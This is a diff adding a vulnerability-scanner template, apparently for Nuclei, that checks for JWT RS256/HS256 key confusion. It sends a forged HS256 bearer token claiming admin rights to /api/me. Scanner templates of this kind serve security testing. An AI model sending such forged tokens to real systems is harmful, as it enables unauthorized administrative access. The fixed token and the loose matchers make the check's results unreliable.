@@ -1,0 +1,30 @@
+id: whai-jwt-key-confusion
+
+info:
+  name: JWT RS256/HS256 Key Confusion
+  author: whitehat-ai
+  severity: critical
+  description: Tests JWT RS256 to HS256 algorithm downgrade
+  tags: jwt,auth,algorithm,critical
+  classification:
+    cwe-id: CWE-327
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/me"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.eBhA1EB1nnP3_4FEcHR0jC9e_JoYfY9JzY1-0Yy4XMQ"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"admin"'
+          - '"name"'
+        condition: or
